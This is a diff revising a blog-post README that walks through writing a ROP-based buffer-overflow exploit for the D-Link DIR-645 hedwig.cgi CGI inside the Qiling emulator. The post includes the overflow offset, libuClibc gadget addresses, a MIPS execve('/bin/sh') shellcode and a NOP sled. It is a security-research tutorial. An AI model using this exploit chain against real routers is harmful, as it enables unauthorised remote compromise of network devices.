@@ -1,13 +1,29 @@
-# Analyzing a buffer overflow in the DLINK DIR-645 with Qiling framework, Part II
+# Analyzing a buffer overflow in the DLINK DIR-645 with Qiling framework, Part II [![Twitter URL](https://img.shields.io/twitter/url?style=social&url=https%3A%2F%2Fgithub.com%2Fnahueldsanchez%2Fblogpost_qiling_dlink_2)](https://twitter.com/intent/tweet?text=https://github.com/nahueldsanchez/blogpost_qiling_dlink_2)
+
+
+
+[![Twitter Follow](https://img.shields.io/twitter/follow/nahueldsanchez_?color=1DA1F2&logo=twitter&style=for-the-badge)](https://twitter.com/nahueldsanchez_?s=20) 
 
 ## Introduction
 
-Hello everyone! continuing with our saga of blog posts about Qiling, today we'll analyze how we can write an exploit that will be "almost" functional in Qiling and the process that I followed to do it. If you did not read my previous blog post, I encourage you to do so, you can find it [here](https://github.com/nahueldsanchez/blogpost_qiling_dlink_1).
+Hello everyone! Continuing with our saga of blog posts about Qiling, today we'll analyze how we can write an exploit that will be "almost" functional in Qiling and the process that I followed to do it. If you did not read my previous blog post [Analyzing a buffer overflow...with Qiling Framework,Part I](https://github.com/nahueldsanchez/blogpost_qiling_dlink_1), I encourage you to do so.
+
+### **Contents**
+1. [Writing the exploit](##Writing-the-exploit)
+2. [Making system call "work"](#Making-system-call-work)
+3. [Writing the exploit to make it work in Qiling](#Writing-the-exploit-to-make-it-work-in-Qiling)  
+    - [Understanding how MIPS calling convention works](#Understanding-how-MIPS-calling-convention-works)
+    - [Playing with ROP and finishing the exploit](#Playing-with-ROP-and-finishing-the-exploit)
+4. [References](#References)
+
+
+
+
 
 ## Writing the exploit
 
-Just to have some context, in the first part we identified the vulnerability, how to trigger it and the underlying cause of it. We'll continue from this point.
-We know that our program will crash returning from address `0x0040c594`, this means function `hedwig_main`:
+Just to have some context, in the first part we identified the vulnerability, how to trigger it and its underlying cause. We'll continue from this point.
+We know that our program will crash returning from address `0x0040c594`, that is, function `hedwig_main`:
 
 ```
 ...
@@ -17,7 +33,7 @@ We know that our program will crash returning from address `0x0040c594`, this me
 ...
 ```
 
-We also know that we are overwriting a lot of memory in the stack and we control good amount of registers:
+We also know that we are overwriting a lot of memory in the stack and we control a good number of registers:
 
 ```
 ...
@@ -47,13 +63,13 @@ We also know that we are overwriting a lot of memory in the stack and we control
 ```
 Considering this scenario, my idea was to overwrite the return address with the address of `system`, previously setting up the parameters as needed. I know that this should work as the exploit included in Metasploit does the same.
 
-To test my hypothesis, I've decided as a first step to get rid of all the complexities and _simulate_ the exploitation. The idea was to allocate some memory, write our command there, load the memory address in the required register and change the return address to point to `system` function. Sounds like a lot of work right? Not for Qiling, check it out:
+To test my hypothesis, I've decided,as a first step, to get rid of all the complexities and _simulate_ the exploitation. The idea was to allocate some memory, write our command there, load the memory address in the required register and change the return address to point to `system` function. Sounds like a lot of work right? Not for Qiling, check it out:
 
 ```Python
 ...
-RETURN_CORRUPTED_STACK = 0x0040c594     # From the previous blog post
+RETURN_CORRUPTED_STACK = 0x0040c594     # From the previous blog post.
 QILING_SYSTEM = 0x0041eb50              # This was retrieved enabling debugging
-                                        # and connecting to GDB, once in the
+                                        # and connecting to GDB.Once at the
                                         # initial breakpoint I executed:
                                         # x/10i system to obtain system function addr
 
@@ -75,7 +91,7 @@ ql.hook_address(simulate_exploit, RETURN_CORRUPTED_STACK)   # We'll call our cal
 ql.run()
 ```
 
-As you can see it's pretty straight forward to simulate our exploit. Let's see what happens:
+As you can see it's pretty straightforward to simulate our exploit. Let's see what happens:
 
 ```
 ...
@@ -90,7 +106,8 @@ rt_sigaction(0x2, 0x7ff3c430, = 0x7ff3c450) = 0
 ChildProcessError: [Errno 10] No child processes
 ...
 ```
-It looks like it worked !?. I think that what's happening is that we are reaching system function and at some point system is trying to use the `fork syscall` which Qiling does not support. To confirm that my idea was working I did two things. First I put a breakpoint on `system` and checked that at some point I hit the breakpoint (it happened). Secondly and more interesting to show, I've changed the call to `system` for `exit`, let's see what happens:
+It looks like it worked!? I think that what's happening is that we are reaching `system` function and at some point `system` is trying to use the `fork syscall`, which Qiling does not support.   
+To confirm that my idea was working I did two things: First, I set a breakpoint on `system` and checked that I hit the breakpoint at some point (it happened); Second, and more interesting to show, I changed the call to `system` for `exit`. Let's see what happens:
 
 ```Python
 def simulate_exploitation(ql):
@@ -111,11 +128,11 @@ Content-Type: text/xml
 ...
 ```
 
-Much better! As we can see the program exits gracefully with the call to `exit()`. We can be sure that the idea for the exploit works!. Let's work on transforming this simulation into something real.
+Much better! As we can see the program exits gracefully with the call to `exit()`. We can be sure that the idea for the exploit works! Let's work on transforming this simulation into something real.
 
 ### Making system call "work"
 
-While reading what I did in the previous step, I realized that I was being lazy taking the shortcut of executing `exit` as shellcode,  and that I should try harder my first idea of calling the system function, based on this I dug deeper on how to make this work.
+While reading what I did in the previous step, I realized that I was being lazy taking the shortcut of executing `exit` as shellcode,  and that I should try harder with my first idea of calling the system function. Based on this, I dug deeper on how to make this work.
 
 My first idea was to check why I was receiving this error:
 
@@ -123,9 +140,8 @@ My first idea was to check why I was receiving this error:
 [!] 0x77507144: syscall ql_syscall_fork number = 0xfa2(4002) not implemented
 ```
 
-I've looked what syscall was 0xfa2 and found it here: https://syscalls.w3challs.com/?arch=mips_o32, _syscall 0xfa2_ is [fork](https://man7.org/linux/man-pages/man2/fork.2.html).
 
-Having this information, I've used [Qiling's ability to extend syscalls](https://docs.qiling.io/en/latest/hijack/#qlset_syscall) like this:
+I [looked up what type of syscall]((https://syscalls.w3challs.com/?arch=mips_o32)) 0xfa2 was, and found that , _syscall 0xfa2_ is a [fork](https://man7.org/linux/man-pages/man2/fork.2.html). With this information, I used [Qiling's ability to extend syscalls](https://docs.qiling.io/en/latest/hijack/#qlset_syscall) like this:
 
 ```Python
 
@@ -161,7 +177,7 @@ def hook_fork(ql, *args, **kw):
 ql.set_syscall(MIPS_FORK_SYSCALL, hook_fork)
 ```
 
-I've copied the code from Qiling's fork implementation just as a test but it worked great:
+I copied the code from Qiling's fork implementation just as a test but it worked great:
 
 ```
 ** at simulate_exploitation **
@@ -180,7 +196,7 @@ Traceback (most recent call last):
   File "emulate_cgibin.py", line 143, in <module>
 ```
 
-We can see the output from our function, but more importantly, we can see the error message from `execve` syscall, that shows us that at the end `execve` was called, confirming that `system` call was executed!. To fix this error I've hijacked `execve` syscall with [Qiling's magic](https://docs.qiling.io/en/latest/hijack/#on-enter-interceptor-with-qlset_syscall) and properly set up the registers to make the call work:
+We can see the output from our function, but more importantly, we can see the error message from `execve` syscall, which shows us that at the end `execve` was called, confirming that `system` call was executed!. To fix this error I hijacked `execve` syscall with [Qiling's magic](https://docs.qiling.io/en/latest/hijack/#on-enter-interceptor-with-qlset_syscall) and properly set up the registers to make the call work:
 
 ```Python
 
@@ -222,11 +238,11 @@ ioctl(0x1, 0x540d, 0x7ff3c5b0) = -1
 ...
 ```
 
-YES!, we can see the output of the execve syscall with our command. Now, we have to make this work without faking it.
+YES! We can see the output of the `execve` syscall with our command. Now we have to make this work without faking it.
 
 Coming back to our main topic, let's do a quick recap on where the code was vulnerable:
 
-We have our `hedgiwcgi_main` function, and thanks Ghidra we can decompile the code. I've just copied the interesting part:
+We have our `hedgiwcgi_main` function, and thanks to Ghidra we can decompile the code. I just copied the interesting part:
 
 ```C
 ...
@@ -235,12 +251,14 @@ uVar2 = sobj_get_string(iVar1);
 sprintf(acStack1064,"%s/%s/postxml","/runtime/session",uVar2);
 ...
 ```
-First the code process our requests and obtains the UID, and later the UID is used in the `sprintf` statement to build a path that's stored in the stack. As we control the UID we can overwrite the stack and end up overwriting the saved return address. Ghidra helps us a bit telling us what type is `acStack1064`, if you check the decompiled code for `hedwigcgi_main` you'll find at the beginning:
+First, the code processes our requests and obtains the UID, and later the UID is used in the `sprintf` statement to build a path that's stored in the stack. As we control the UID we can overwrite the stack and end up overwriting the saved return address. Ghidra helps us a bit telling us what type  `acStack1064` is, if you check the decompiled code for `hedwigcgi_main` you'll find at the beginning:
 
 ```C
 char acStack1064 [1024];
 ```
-We know that we'll need at least 1024 bytes to fill up this variable, plus X bytes more until we can overwrite the saved return address. There are several ways to calculate this, you can use a cyclic pattern and check with what pattern $ra is overwritten. Another option is to check when the return address is restored at address `0x0040c568` and there we can see from what memory address is being read:
+We know that we'll need at least 1024 bytes to fill up this variable, plus X bytes more until we can overwrite the saved return address. There are several ways to calculate this:
++ You can use a cyclic pattern and check what pattern overwrites $ra. 
++ Another option is to check when the return address is restored at address `0x0040c568` and there we can see from which memory address is being read:
 
 ```
 ...
@@ -249,11 +267,11 @@ We know that we'll need at least 1024 bytes to fill up this variable, plus X byt
 ```
 We can use this information along with GDB, and set a breakpoint just before and after the call to `sprintf` and do the math:
 
-- We know our destination buffer is located at: 0x7ff3c1e0
-- We know that our saved return address is located at: 0x7ff3c604 ($sp+0x4e4)
+- We know our destination buffer is located at 0x7ff3c1e0
+- We know that our saved return address is located at 0x7ff3c604 ($sp+0x4e4)
 - If we do 0x7ff3c604-0x7ff3c1e0 = 1060 bytes, but we have to account for the fixed string. That's len(/runtime/session/) -> 17
 
-This gives us a grand total of 1043 bytes. Let's test this, we'll put 1043 "A" and overwrite our return address with "BBBB", I put a breakpoint after the instruction that restores the $ra register before returning to it:
+This gives us a grand total of 1043 bytes. Let's test this. We'll put 1043 "A" and overwrite our return address with "BBBB". I set a breakpoint after the instruction that restores the $ra register before returning to it:
 
 ```Python
 ...
@@ -287,7 +305,7 @@ $ra  : 0x42424242 ("BBBB"?)
 ...
 ```
 
-It worked!. We already know that we 1043 bytes to overwrite the return address, let's try to use this to do something useful. My idea was to use part of our 1043 bytes buffer to place a our shellcode to call `execve("/bin/sh")` and jump to it. I assumed that code in the stack is executable (no NX bit). I think that this is safe assumption based on what I read about these cheap routers, also the exploit in [Metasploit](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/linux/http/dlink_hedwig_cgi_bof.rb) does this.
+It worked! We already know that we have 1043 bytes to overwrite the return address, let's try to use this to do something useful. My idea was to use part of our 1043 bytes buffer to place  our shellcode to call `execve("/bin/sh")` and jump to it. I assumed that the code in the stack is executable (no NX bit); I think that this is a safe assumption based on what I read about these cheap routers, also the exploit in [Metasploit](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/linux/http/dlink_hedwig_cgi_bof.rb) does this.
 
 
 ### Writing the exploit to make it work in Qiling
@@ -298,25 +316,27 @@ With the above problems solved I proceeded to work on writing an exploit that co
 - Keep learning about Qiling
 - Have fun...?
 
-It turns out that I took me quite some time to make this work but I found tremendous value doing it as I learned new things and performed some really good hands-on training.
+It turns out that it took me quite some time to make this work, but I found tremendous value doing it as I learned new things and performed some really good hands-on training.
 
-Starting with Pedro [Ribeiro's advisory](https://raw.githubusercontent.com/pedrib/PoC/master/advisories/dlink-hnap-login.txt) for a different CVE with similar characteristics I started to work on my idea. The plan I had in mind was:
+I started to work on my idea with Pedro [Ribeiro's advisory](https://raw.githubusercontent.com/pedrib/PoC/master/advisories/dlink-hnap-login.txt) for a different CVE with similar characteristics. The plan I had in mind was:
+
+
 
 1) Exploit the vulnerability and overwrite the return address
-2) Having control over the program's flow redirect execution and execute Sleep to simulate what you have to do on MIPS to have a reliable exploit and deal with cache incoherency
+2) Once having control over the program's flow,redirect execution and execute Sleep to simulate what you have to do on MIPS to have a reliable exploit and deal with cache incoherency
 3) Find my shellcode in the stack
 4) Redirect execution to it
 
 
 #### Understanding how MIPS calling convention works
 
-Having already completed step one I decided to do what I thought was a quick test: Directly overwrite the return address with the address of the `sleep` function and set the required parameters simulating the exploitation:
+Having already completed step one, I decided to do what I thought was a quick test: Directly overwrite the return address with the address of the `sleep` function, and set the required parameters simulating the exploitation:
 
-To find the address of sleep I thought that was enough with doing: `info functions <function name>` but this will return the address of the function mapped in the `cgi-bin` binary and no the real address from the `libuClibc.so` library.
+To find the address of sleep, I thought that it was enough with doing: `info functions <function name>`, but this will return the address of the function mapped in the `cgi-bin` binary and no the real address from the `libuClibc.so` library.
 
 To find the correct address I followed these steps:
 
-1) I've checked at what address the `libuClibc` was being loaded, I did this with these lines of code:
+1) I checked at what address the `libuClibc` was being loaded with these lines of code:
 
 ```Python
 def simulate_exploit(ql):
@@ -325,7 +345,7 @@ def simulate_exploit(ql):
     ...
 ```
 
-Once I run the program and landed in the Python shell provided by PDB, I used `
+Once I ran the program and landed in the Python shell provided by PDB, I used `
 ql.mem.show_mapinfo()` and got:
 
 ```
@@ -336,9 +356,9 @@ ql.mem.show_mapinfo()` and got:
 ...
 ```
 
-Now we know that our library is being loaded at: `0x774fc000`
+Now we know that our library is being loaded at `0x774fc000`
 
-2) I' opened the `libuClibc-0.9.30.1.so` with Ghidra and looked fo `sleep` function offset:
+2) I opened the `libuClibc-0.9.30.1.so` with Ghidra and looked for `sleep` function offset:
 
 ```
 uint __stdcall sleep(uint __seconds)
@@ -346,7 +366,7 @@ uint __stdcall sleep(uint __seconds)
 00066bd0 02 00 1c 3c            lui        gp,0x2
 ...
 ```
-I got offset `0x00066bd0`. Then I concluded that doing base address + offset I was going to be fine, however after trial and error and checking other function addresses with GDB I found out that I needed t subtract 0x10000. So I came with the following Python function:
+I got offset `0x00066bd0`. Then I concluded that doing base address + offset I was going to be fine; however, after trial and error and checking other function addresses with GDB I found out that I needed to subtract 0x10000. So, I up came up with the following Python function:
 
 ```Python
 def calc_address(addr_offset):
@@ -355,7 +375,7 @@ def calc_address(addr_offset):
     return LIBC_BASE + addr_offset - 0x10000
 ```
 
-With this sleep address in this particular lib will be located at: `0x77552bd0`. Once having this address I tried to overwrite $RA register with it simulating exploitation:
+ This sleep address, in this particular lib, will be located at `0x77552bd0`. Once having this address, I tried to use it to overwrite $RA register simulating exploitation:
 
 ```Python
 def simulate_exploit(ql):
@@ -369,10 +389,10 @@ def simulate_exploit(ql):
 
 **This attempt failed miserably** and got me stuck for a couple of days, until I found these blog posts:
 
-- https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-1/
-- https://www.lorem.club/~/Haskal@write.lain.faith/mips-rop
+- [Firmware Exploitation with JEB: Part 1](https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-1/ )
+- [MIPS ROP by haskal](https://www.lorem.club/~/Haskal@write.lain.faith/mips-rop)
 
-Both articles explain between other things (I'm super summarizing them) that due how MIPS works you can't only overwrite `$ra` as `$t9` and the `$gp` registers are used as well to calculate stuff once a function is called. So  you need the address of the function called in `$t9`.
+Both articles explain among other things (I'm super summarizing them) that due to how MIPS works you can't only overwrite `$ra` as `$t9`, and the `$gp` registers are used as well to calculate stuff once a function is called. So, you need the address of the function called in `$t9`.
 
 With this information I slightly modified the function above to change `$t9` register and this time the test worked flawlessly:
 
@@ -387,18 +407,18 @@ nanosleep(0x7ff3c770, 0x7ff3c770) = 0 <--- Sleep is executed
 
 #### Playing with ROP and finishing the exploit
 
-Once I got the test working, I decided to explore how was possible to build what I think is a reliable exploit, for that, I've tried to avoid fixing addressess other than the ones from the `uClibc` and use ROP.
+Once I got the test working, I decided to explore how it was possible to build what I think is a reliable exploit. To do so, I've tried to avoid fixing addresses other than the ones from the `uClibc` and use ROP.
 
-To be able to do that I needed different ROP gadgets that would perform the steps previously mentioned. To find them I performed some (slowly and painfull) manual work and complemented it with [devtty0's Ghidra scripts helpes](https://github.com/tacnetsol/ghidra_scripts/).
+To be able to do that I needed different ROP gadgets that would perform the steps previously mentioned. To find them I performed some (slowly and painfull) manual work and complemented it with [devtty0's Ghidra scripts helper](https://github.com/tacnetsol/ghidra_scripts/).
 
-_Note: I had some issues with these scripts like false negatives or gadgets that did not work. Because of that I had to complement the work with some manual search._
+>_Note: I had some issues with these scripts like false negatives or gadgets that did not work. Because of that I had to complement the work with some manual search._
 
 To be able to put my shellcode in the environment variable `HTTP_COOKIE` I had to slightly modify Qiling's code to accept `bytes` as well as `strings`:
 
-_Note: The code was already there I had to uncomment it._
+>_Note: The code was already there, I had to uncomment it._
 
 
-- function [copy_str](https://github.com/qilingframework/qiling/blob/master/qiling/loader/elf.py#L123)
+- [Qiling's copy_str](https://github.com/qilingframework/qiling/blob/master/qiling/loader/elf.py#L123) function: 
 
 ```Python
 def copy_str(self, addr, l):
@@ -414,9 +434,9 @@ def copy_str(self, addr, l):
     return l_addr, s_addr
 ```
 
-The first gadget that I needed was one to execute `sleep()` while having a reasonable small value in `$a0` that will serve as argument in seconds to sleep. Also this gadget had to allow me maintain control of the execution flow. I found the following one:
+The first gadget that I needed was one to execute `sleep()` while having a reasonably small value in `$a0` that will serve as argument in seconds to sleep. Also, this gadget had to allow me to maintain control of the execution flow. I found the following one:
 
-_Note: All the gadgets were found in the libuClibc-0.9.30.1.so_
+>_Note: All the gadgets were found in the libuClibc-0.9.30.1.so_
 
 ```asm
 #Gadget 1 (calls sleep(3) and jumps to  $s5)
@@ -432,7 +452,7 @@ _Note: All the gadgets were found in the libuClibc-0.9.30.1.so_
 # 0003bcb4 21 30 00 00            _clear     a2
 ```
 
-The second one (which its address has to be in `$s5`) had to adjust the stack pointer `$sp` to land in my shellcode and put its value in a register:
+The second one (which address has to be in `$s5`) had to adjust the stack pointer `$sp` to land in my shellcode and put its value in a register:
 
 ```asm
 # Gadget 2 (Adjusts $sp and puts stack addess in $s1)
@@ -445,7 +465,7 @@ The second one (which its address has to be in `$s5`) had to adjust the stack po
 # 0004dcc8 01 00 06 24            _li        __name,0x1
 ```
 
-After this gadget was executed I had register `$s1` pointing to my code in the stack and could control the execution flow controlling the value of `$s0` register. Luckily, if you remember from the beginning of the blog post we control it. Our last gadget then had to execute code referenced by `$t9`:
+After this gadget was executed I had register `$s1` pointing to my code in the stack and could control the execution flow controlling the value of `$s0` register. Luckily, if you remember from the beginning of the blog post we have control over it. Our last gadget then had to execute code referenced by `$t9`:
 
 ```
 # Gadget 3 (jumps to $s1 -> Stack)
@@ -454,7 +474,7 @@ After this gadget was executed I had register `$s1` pointing to my code in the s
 # 0001bb4c 03 00 04 24            _li        __size,0x3
 ```
 
-Once I had the required gadgets I looked for a shellcode to execute `execve(/bin/sh)`. I found one that worked in the following [blogpost](https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-2/):
+Once I had the required gadgets, I looked for a shellcode to execute `execve(/bin/sh)`. I found one that worked in the [Firmware exploitation with JEB: Part 2blogpost](https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-2/):
 
 ```Python
 # execve shellcode translated from MIPS to MIPSEL
@@ -476,7 +496,7 @@ shellcode += b"\xab\x0f\x02\x24" # addiu;$v0, $zero, 0xfab
 shellcode += b"\x0c\x01\x01\x01" # syscall 0x40404\
 ```
 
-In the same blogpost a clever nopsled is highlighted, I used it too:
+In the same blogpost a clever NOP sled is highlighted, I used it too:
 
 ```Python
 # MIPS nopsled from https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-2/
@@ -484,7 +504,7 @@ buffer += b"\x26\x40\x08\x01" * 30 + shellcode
 # ###########
 ```
 
-Having all the pieces the only thing that I had to do was to build the final payload with the following structure:
+Having all the pieces, the only thing that I had to do was to build the final payload with the following structure:
 
 ```Python
 ...
@@ -526,13 +546,20 @@ ioctl(0x1, 0x540d, 0x7ff3c8c8) = -1
 ...
 ```
 
-We can see the strings printed from our previous blog, the call to `nanosleep` made by the `sleep()` function and finally the call to `execve`. Job done.
+We can see: 
++ the strings printed from our previous blog 
++ the call to `nanosleep` made by the `sleep()` function 
++ (and finally) the call to `execve`.     
 
-you can find the Python script to reproduce this [here](https://github.com/nahueldsanchez/blogpost_qiling_dlink_2/blob/master/qiling_dlink_exploit.py). I left comments to the helper functions mentioned during the blog post in case you want to play around or do some testing.
+Job done.
+
+If you want to reproduce this, go to [qiling_dlink_exploit.py](https://github.com/nahueldsanchez/blogpost_qiling_dlink_2/blob/master/qiling_dlink_exploit.py) to get the  Python script. I left comments to the helper functions mentioned during the blog post in case you want to play around or do some testing.   
+
+[![Website](https://img.shields.io/website?label=nahueldsanchez&up_color=success&up_message=Blog&url=https%3A%2F%2Fnahueldsanchez.wordpress.com%2F)](https://nahueldsanchez.wordpress.com/)
 
 # References
 
-https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN/ - Blog post that Analyzes the same vulnerability described here. It looks really interesting and provides an interesting analysis.
+https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN/ - Blog post that analyzes the same vulnerability described here. It looks really interesting and provides an interesting analysis.
 
 https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-1/ - Excellent blog post that helped me understand how to prepare the registers to make my shellcode work on MIPS. It also highlights some key differences between exploitation on X86 and MIPS.
 
